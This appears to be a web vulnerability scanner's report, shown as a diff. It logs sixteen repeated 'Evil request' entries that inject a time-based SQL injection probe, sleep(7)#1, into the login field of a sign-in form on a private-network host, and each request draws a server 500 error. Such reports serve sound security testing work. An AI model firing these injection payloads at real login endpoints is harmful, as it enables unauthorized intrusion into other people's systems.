+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=XKh8iRnCQtomZuZ8pJxqOL163xVUtRbIqv0mhXVMuKqrZZIoHg8_mq9AV-_99pGyDuLA-OFKYUO50QKcGuFvxQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=qrwjdCI1A0RntjzrmEiB0OF8LsBXE0Epnede4uF_IWpdcc3VJfh-BO6QjXjBInpaUuQxLeLsNqKOy3r7jtL2BQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=5JAtqRnKikc4v5NdLGY9FV1VRYy3ulYU53uH43WxIocTXcMIHgf3B7GZIs51DMaf7s1aYQJFIZ_0V6P6Ghz16A&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=DIwz8VIt1lHZUFEO-xsg6ayTzbDT39YXq7Lh1WyaMBb7Qd1QVeCrEVB24J2icdtjHwvSXWYgoZy4nsXMAzfneQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=eutgIElYUIclNYM0fW3cXI95aoB1zNlTvdWCHOCjudiNJo6BTpUtx6wTMqckByfWPOF1bcAzrtiu-aYFjw5utw&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=WDAUJrFieiXJdqA_4X-ImKUh9XfikMH5s1HT_Jf2Zkmv_fqHtq8HZUBQEay4FXMSFrnqmldvtnKgfffl-FuxJg&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=1luruHcm9baalSc0O1UAcWon-OifM9sqKeZc_V6syB8hlkUZcOuI9hOzlqdiP_v72b_nBSrMrKE6ynjkMQEfcA&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=cuqCl93GgqSO2mM7GIw7SpYsrtBFuPIXSB2KgHKu-FCFJ2w22gv_5Af80qhB5sDAJbSxPfBHhZxbMa6ZHQMvPw&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=C0fCj2hBMeuxRyT2fwmu9NIDOIMbxmUMFGA-ZQ2Q6cb8iiwub4xMqzhhlWUmY1V-YZsnbq45EocHTBp8Yj0-qQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=jAkmVZWWABu18QmIHs_bFGa7TQH7UsWOf7O1RS0kFFZ7xMj0klt9WzzXuBtHpSCe1SNS7E6tsgVsn5FcQonDOQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=nZjJEEwHmYeked5bNcLo3jbENDn3DbGw9txQaaK7_6dqVSexS8rkxy1fb8hsqBNUhVwr1ELyxjvl8HRwzRYoyA&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=joivbkz16jetT6dVIbfaa89ERrOxKTWC4dphPdhWsMZ5RUHPSziXdyRpFsZ43SHhfNxZXgTWQgny9kUkt_tnqQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=jlenXr42sPGnw6Jai-LCEDIh1HzkYuarcVf0utOWjYx5mkn_ufvNsS7lE8nSiDmagbnLkVGdkSBie9CjvDta4w&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=lULCqq91-O3X2ERCBAmN4JLzmzx58noQgmcz6QnthWZijywLqLiFrV7-9dFdY3ZqIWuE0cwNDZuRSxfwZkBSCQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=TY3y82mA66rhbAJhT-MHdAdUhtMUJXyhprx53WybOfq6QBxSbk2W6mhKs_IWifz-tMyZPqHaCyq1kF3EAzbulQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=aiZlKHqRhrhX23wDx1h06wHAOug_QTdp6Z3-uc6qPWKd64uJfVz7-N79zZCeMo9hslglBYq-QOL6sdqgoQfqDQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+********************************************************************************
+Summary of additionals :
+------------------------
+                                               Fingerprint web technology :   0
+********************************************************************************
